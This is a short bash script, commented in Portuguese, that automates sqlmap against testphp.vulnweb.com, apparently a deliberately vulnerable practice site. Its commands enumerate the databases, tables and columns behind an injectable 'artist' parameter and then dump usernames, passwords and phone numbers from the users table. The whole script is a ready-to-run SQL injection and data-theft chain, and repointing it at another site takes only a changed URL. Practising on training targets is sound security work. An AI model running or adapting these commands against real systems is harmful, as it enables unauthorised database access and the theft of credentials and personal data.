#!/bin/bash

DOMINIO=("testphp.vulnweb.com")

echo -e "Inciando o teste automatizado do SQLmap para o dominio => $DOMINIO"

#
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs

#
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables

#
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --columns

#
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname,pass --dump

# Realiza a varredura dos phone no banco de dados.
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C phone --dump
